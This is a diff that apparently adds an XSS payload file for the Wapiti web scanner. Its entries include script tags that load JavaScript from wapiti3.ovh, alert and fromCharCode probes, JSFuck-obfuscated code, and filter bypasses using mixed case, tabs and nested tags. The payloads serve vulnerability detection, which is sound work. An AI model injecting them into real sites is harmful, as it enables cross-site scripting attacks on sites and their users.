@@ -1,0 +1,321 @@
+; Let's start with the most obvious XSS payloads
+[script_absolute_src]
+payload = <script src=https://wapiti3.ovh/__XSS__z.js></script>
+tag = script
+attribute = src
+value = https://wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
+[script_protocol_src]
+payload = <script src=//wapiti3.ovh/__XSS__z.js></script>
+tag = script
+attribute = src
+value = //wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
+[script_alert_quote]
+payload = <script>alert('__XSS__')</script>
+tag = script
+attribute = string
+value = alert('__XSS__')
+case_sensitive = yes
+
+[script_alert_double_quote]
+payload = <script>alert("__XSS__")</script>
+tag = script
+attribute = string
+value = alert("__XSS__")
+case_sensitive = yes
+
+[script_alert_regex]
+payload = <script>alert(/__XSS__/)</script>
+tag = script
+attribute = string
+value = alert(/__XSS__/)
+case_sensitive = yes
+
+[script_jsfuck_13_plus_37]
+payload = <script>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]([+!+[]]+[!+[]+!+[]+!+[]]+(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])()</script>
+tag = script
+attribute = string
+value = [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]([+!+[]]+[!+[]+!+[]+!+[]]+(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])()
+case_sensitive = no
+
+[script_fromcharcode]
+payload = <script>String.fromCharCode(0,__XSS__,1)</script>
+tag = script
+attribute = string
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[script_alert_parentheses_regex]
+payload = <script>(alert)(/__XSS__/);</script>
+tag = script
+attribute = string
+value = (alert)(/__XSS__/);
+case_sensitive = yes
+
+[img_onerror_alert_double_quote]
+payload = <img src=. onerror=alert("__XSS__")>
+tag = img
+attribute = onerror
+value = alert("__XSS__")
+case_sensitive = yes
+
+[img_onerror_alert_quote]
+payload = <img src=. onerror=alert('__XSS__')>
+tag = img
+attribute = onerror
+value = alert('__XSS__')
+case_sensitive = yes
+
+[img_onerror_alert_regex]
+payload = <img src=. onerror=alert(/__XSS__/)>
+tag = img
+attribute = onerror
+value = alert(/__XSS__/)
+case_sensitive = yes
+
+[img_onerror_fromcharcode]
+payload = <img src=. onerror=String.fromCharCode(0,__XSS__,1)>
+tag = img
+attribute = onerror
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[object_data_alert_quote]
+payload = <object data="javascript:alert('__XSS__')">
+tag = object
+attribute = data
+value = javascript:alert('__XSS__')
+case_sensitive = yes
+
+[object_data_fromcharcode]
+payload = <object data=javascript:String.fromCharCode(0,__XSS__,1)>
+tag = object
+attribute = data
+value = javascript:String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[param_value_alert_quote]
+payload = <object><param name=x value=javascript:alert('__XSS__')></object>
+tag = param
+attribute = value
+value = javascript:alert('__XSS__')
+case_sensitive = yes
+
+[param_value_alert_double_quote]
+payload = <object><param name=x value=javascript:alert("__XSS__")></object>
+tag = param
+attribute = value
+value = javascript:alert("__XSS__")
+case_sensitive = yes
+
+[param_value_fromcharcode]
+payload = <object><param name=x value=javascript:String.fromCharCode(0,__XSS__,1)></object>
+tag = param
+attribute = value
+value = javascript:String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[iframe_src_javascript]
+payload = <iframe src="javascript:String.fromCharCode(0,__XSS__,1);"></iframe>
+tag = iframe
+attribute = src
+value = javascript:String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[frame_src_javascript]
+payload = <frameset><frame src="javascript:String.fromCharCode(0,__XSS__,1);"></frame>
+tag = frame
+attribute = src
+value = javascript:String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+
+
+; Tricks
+[script_slash_absolute_src]
+payload = <script/ src=https://wapiti3.ovh/__XSS__z.js></script/>
+tag = script
+attribute = src
+value = https://wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
+
+
+; Those are simple case sensitive bypass
+[case_script_alert_quote]
+payload = <ScRiPt>alert('__XSS__')</sCrIpT>
+tag = script
+attribute = string
+value = alert('__XSS__')
+case_sensitive = yes
+
+[case_script_alert_double_quote]
+payload = <ScRiPt>alert("__XSS__")</sCrIpT>
+tag = script
+attribute = string
+value = alert("__XSS__")
+case_sensitive = yes
+
+[case_script_alert_regex]
+payload = <ScRiPt>alert(/__XSS__/)</sCrIpT>
+tag = script
+attribute = string
+value = alert(/__XSS__/)
+case_sensitive = yes
+
+[case_script_fromcharcode]
+payload = <ScRiPt>String.fromCharCode(0,__XSS__,1)</sCrIpT>
+tag = script
+attribute = string
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[case_script_absolute_src]
+payload = <ScRiPt src=https://wapiti3.ovh/__XSS__z.js></sCrIpT>
+tag = script
+attribute = src
+value = https://wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
+[case_script_slash_absolute_src]
+payload = <ScRiPt/ src=https://wapiti3.ovh/__XSS__z.js></sCrIpT/>
+tag = script
+attribute = src
+value = https://wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
+[case_script_jsfuck_13_plus_37]
+payload = <ScRiPt>[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]([+!+[]]+[!+[]+!+[]+!+[]]+(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])()</sCrIpT>
+tag = script
+attribute = string
+value = [][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]([+!+[]]+[!+[]+!+[]+!+[]]+(+(+!+[]+(!+[]+[])[!+[]+!+[]+!+[]]+[+!+[]]+[+[]]+[+[]])+[])[!+[]+!+[]]+[!+[]+!+[]+!+[]]+[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]+!+[]])()
+case_sensitive = no
+
+
+
+; Try injecting whitespaces...
+[tab_script_absolute_src]
+payload = <script[TAB]src=https://wapiti3.ovh/__XSS__z.js></script>
+tag = script
+attribute = src
+value = https://wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
+[case_tab_script_absolute_src]
+payload = <ScRiPt[TAB]src=https://wapiti3.ovh/__XSS__z.js></sCrIpT>
+tag = script
+attribute = src
+value = https://wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
+[tab_img_onerror_fromcharcode]
+payload = <img[TAB]src=.[TAB]onerror=String.fromCharCode(0,__XSS__,1)>
+tag = img
+attribute = onerror
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[space_script_alert_quote]
+payload = <script >alert('__XSS__')</script >
+tag = script
+attribute = string
+value = alert('__XSS__')
+case_sensitive = yes
+
+[space_script_alert_double_quote]
+payload = <script >alert("__XSS__")</script >
+tag = script
+attribute = string
+value = alert("__XSS__")
+case_sensitive = yes
+
+[space_script_fromcharcode]
+payload = <script >String.fromCharCode(0,__XSS__,1)</script >
+tag = script
+attribute = string
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[case_space_script_fromcharcode]
+payload = <ScRiPt >String.fromCharCode(0,__XSS__,1)</ sCrIpT>
+tag = script
+attribute = string
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[case_tab_script_fromcharcode]
+payload = <ScRiPt[TAB]>String.fromCharCode(0,__XSS__,1)</[TAB]sCrIpT>
+tag = script
+attribute = string
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[tab_object_data_fromcharcode]
+payload = <object[TAB]data=javascript:String.fromCharCode(0,__XSS__,1)>
+tag = object
+attribute = data
+value = javascript:String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+
+
+; Bypass remove of tags
+[open_script_tag_remove_alert_quote]
+payload = <scr<script>ipt>alert('__XSS__')</script>
+tag = script
+attribute = string
+value = alert('__XSS__')
+case_sensitive = yes
+
+[script_tag_remove_alert_quote]
+payload = <scr<script>ipt>alert('__XSS__')</scr</script>ipt>
+tag = script
+attribute = string
+value = alert('__XSS__')
+case_sensitive = yes
+
+[open_script_tag_remove_alert_double_quote]
+payload = <scr<script>ipt>alert("__XSS__")</script>
+tag = script
+attribute = string
+value = alert("__XSS__")
+case_sensitive = yes
+
+[script_tag_remove_alert_double_quote]
+payload = <scr<script>ipt>alert("__XSS__")</scr</script>ipt>
+tag = script
+attribute = string
+value = alert("__XSS__")
+case_sensitive = yes
+
+[open_script_tag_remove_fromcharcode]
+payload = <scr<script>ipt>String.fromCharCode(0,__XSS__,1)</script>
+tag = script
+attribute = string
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[script_tag_remove_fromcharcode]
+payload = <scr<script>ipt>String.fromCharCode(0,__XSS__,1)</scr</script>ipt>
+tag = script
+attribute = string
+value = String.fromCharCode(0,__XSS__,1)
+case_sensitive = yes
+
+[open_script_tag_remove_absolute_src]
+payload = <scr<script>ipt src=https://wapiti3.ovh/__XSS__z.js></script>
+tag = script
+attribute = src
+value = https://wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
+[script_tag_remove_absolute_src]
+payload = <scr<script>ipt src=https://wapiti3.ovh/__XSS__z.js></scr</script>ipt>
+tag = script
+attribute = src
+value = https://wapiti3.ovh/__XSS__z.js
+case_sensitive = no
+
